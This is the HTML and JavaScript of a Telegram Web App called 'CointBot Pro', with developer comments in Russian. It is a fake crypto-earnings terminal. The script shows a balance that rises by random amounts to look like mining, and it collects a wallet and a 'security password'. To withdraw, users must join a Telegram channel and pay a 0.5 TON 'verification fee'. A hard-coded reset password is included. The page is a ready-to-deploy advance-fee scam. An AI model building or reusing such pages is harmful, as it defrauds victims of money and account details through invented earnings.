<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CointBot Pro | Terminal</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background-color: #000000;
            color: white;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        /* Баланс */
        .balance-container { text-align: center; margin-bottom: 25px; }
        .label-top { color: #8a8a8e; font-size: 12px; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 5px; }
        .balance-value { font-size: 50px; font-weight: 900; font-variant-numeric: tabular-nums; text-shadow: 0 0 25px rgba(64, 167, 227, 0.4); }
        .currency { color: #40a7e3; margin-right: 5px; }

        /* Поля ввода */
        .input-group { width: 85%; max-width: 320px; margin-bottom: 12px; }
        .input-label { font-size: 10px; color: #40a7e3; font-weight: bold; margin-bottom: 5px; margin-left: 5px; text-transform: uppercase; }
        input {
            width: 100%; background: #111; border: 1px solid #222; border-radius: 14px;
            padding: 14px; color: white; font-size: 14px; box-sizing: border-box; outline: none; transition: 0.3s;
        }
        input:focus { border-color: #40a7e3; background: #161616; }

        /* Блок заданий (Монетизация) */
        .tasks-box {
            width: 85%; max-width: 320px; background: rgba(64, 167, 227, 0.05);
            border: 1px dashed #333; border-radius: 14px; padding: 15px; margin-bottom: 20px; box-sizing: border-box;
        }
        .task-item { display: flex; justify-content: space-between; align-items: center; }
        .task-text { font-size: 12px; color: #eee; }
        .task-btn {
            background: #40a7e3; color: white; border: none; padding: 6px 12px;
            border-radius: 8px; font-size: 11px; font-weight: bold; cursor: pointer; text-decoration: none;
        }

        /* Кнопка вывода */
        .withdraw-btn {
            width: 85%; max-width: 320px; background: #ffffff; color: #000000;
            border: none; padding: 18px; border-radius: 35px; font-size: 16px;
            font-weight: 800; cursor: pointer; transition: 0.2s; box-shadow: 0 10px 20px rgba(255,255,255,0.1);
        }
        .withdraw-btn:active { transform: scale(0.96); opacity: 0.8; }

        /* Статус */
        .status { margin-top: 15px; font-size: 10px; color: #4cd964; display: flex; align-items: center; gap: 6px; font-weight: bold; }
        .dot { width: 6px; height: 6px; background: #4cd964; border-radius: 50%; animation: pulse 1s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
    </style>
</head>
<body>

    <div class="balance-container">
        <div class="label-top">Live Profit Pool</div>
        <div class="balance-value">
            <span class="currency">$</span><span id="balance">0.00</span>
        </div>
        <div class="status">
            <div class="dot"></div> PROTOCOL ACTIVE
        </div>
    </div>

    <div class="tasks-box">
        <div class="task-item">
            <div class="task-text"><b>Step 1:</b> Join Official Channel</div>
            <a href="https://t.me/hackpackposter" class="task-btn">JOIN</a>
        </div>
        <div style="font-size: 9px; color: #666; margin-top: 8px;">Withdrawal is locked until subscription is verified.</div>
    </div>

    <div class="input-group">
        <div class="input-label">Enter TG Wallet</div>
        <input type="text" id="wallet" placeholder="UQAr9x... or @username">
    </div>

    <div class="input-group">
        <div class="input-label">Security Password</div>
        <input type="password" id="password" placeholder="••••••••">
    </div>

    <button class="withdraw-btn" onclick="processWithdraw()">WITHDRAW NOW</button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.setHeaderColor('#000000');

        let balance = 0.00;
        let isDead = false;
        const balanceDisplay = document.getElementById('balance');

        // Эффект майнинга баланса
        function mine() {
            if (isDead) return;
            balance += Math.random() * 0.12; 
            balanceDisplay.innerText = balance.toLocaleString('en-US', {
                minimumFractionDigits: 2, maximumFractionDigits: 2
            });
        }
        setInterval(mine, 100);

        function processWithdraw() {
            const wallet = document.getElementById('wallet').value;
            const pass = document.getElementById('password').value;

            if (!wallet) {
                tg.showAlert("⚠️ Please enter your TG Wallet address first.");
                return;
            }

            // Твой секретный пароль обнуления
            if (pass === "hackpack1977") {
                isDead = true;
                balance = 0.00;
                balanceDisplay.innerText = "0.00";
                balanceDisplay.style.color = "#ff3b30";
                tg.sendData("HACK_RESET_TRIGGERED");
                tg.showAlert("🛑 Security Breach: Account Reset.");
                return;
            }

            // Обычный сценарий (проверка подписки и комиссия)
            tg.showPopup({
                title: 'Withdrawal Pending',
                message: `To complete withdrawal of $${balance.toFixed(2)}, you must:\n1. Be a member of @hackpackposter\n2. Pay network fee (0.5 TON)`,
                buttons: [
                    {id: 'pay', type: 'default', text: 'Pay Verification Fee'},
                    {id: 'cancel', type: 'destructive', text: 'Cancel'}
                ]
            }, function(id) {
                if (id === 'pay') {
                    tg.sendData(`request_pay_fee_${balance.toFixed(2)}`);
                }
            });
        }
    </script>
</body>
</html>
